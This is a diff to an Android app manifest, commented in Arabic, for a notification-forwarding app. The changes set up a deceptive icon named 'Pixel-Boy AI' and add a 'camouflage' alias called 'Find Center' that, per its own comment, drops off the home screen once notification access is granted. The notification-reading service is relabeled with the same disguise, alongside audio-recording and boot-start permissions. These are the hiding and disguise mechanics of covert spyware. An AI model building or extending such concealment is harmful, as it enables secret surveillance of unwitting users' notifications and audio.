@@ -4,11 +4,9 @@
     <!-- الإذونات الأساسية -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    
-    <!-- 🌟 إذن التسجيل الصوتي للمساعد البكسلي -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     
-    <!-- 🌟 إذونات تشغيل الخدمات في الخلفية بانتظام (Android 13+ & 14+) -->
+    <!-- إذونات تشغيل الخدمات في الخلفية بانتظام -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
@@ -24,7 +22,7 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.NotificationForwarder">
 
-        <!-- 🌟 تم تعديل enabled إلى true ليتمكن التطبيق من الفتح للمرة الأولى بشكل طبيعي -->
+        <!-- النشاط الرئيسي -->
         <activity
             android:name=".MainActivity"
             android:enabled="true"
@@ -32,7 +30,7 @@
             android:launchMode="singleTask">
         </activity>
 
-        <!-- 🌟 المدخل الوحيد للأيقونة على الشاشة الرئيسية عند التثبيت -->
+        <!-- 🌟 1. الأيقونة والاسم الأساسي اللي هيظهر للمستخدم في الأول (Pixel-Boy AI) -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
@@ -46,19 +44,32 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- 🌟 خدمة قراءة الإشعارات مع إضافة نوع الخدمة للتوافق مع أندرويد 14 -->
+        <!-- 🌟 2. الـ Alias التمويهي بعد تفعيل الإذن (مركز العثور) - بدون LAUNCHER عشان يختفي من الشاشة -->
+        <activity-alias
+            android:name=".StealthAlias"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher" 
+            android:label="مركز العثور">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- خدمة قراءة الإشعارات -->
         <service
             android:name=".service.AppNotificationListenerService"
             android:exported="true"
             android:foregroundServiceType="dataSync"
-            android:label="Notification Forwarder"
+            android:label="مركز العثور"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
 
-        <!-- مستقبل التشغيل التلقائي عند إعادة تشغيل الهاتف -->
+        <!-- مستقبل التشغيل التلقائي -->
         <receiver
             android:name=".receiver.BootCompletedReceiver"
             android:enabled="true"
